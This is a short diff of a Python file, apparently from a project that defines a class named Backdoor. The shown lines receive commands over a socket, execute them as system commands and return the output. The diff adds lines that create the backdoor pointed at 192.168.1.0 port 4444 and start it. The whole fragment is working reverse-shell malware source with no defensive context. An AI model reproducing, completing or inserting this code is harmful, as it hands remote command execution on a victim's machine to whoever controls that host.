@@ -27,4 +27,7 @@ class Backdoor:
             command = self.connection.recv(2048)
             command_result = self.execute_system_command(command.decode())
             self.connection.send(command_result)
-        self.connection.close()                
+        self.connection.close()
+
+my_backdoor = Backdoor("192.168.1.0",4444)
+my_backdoor.run()                
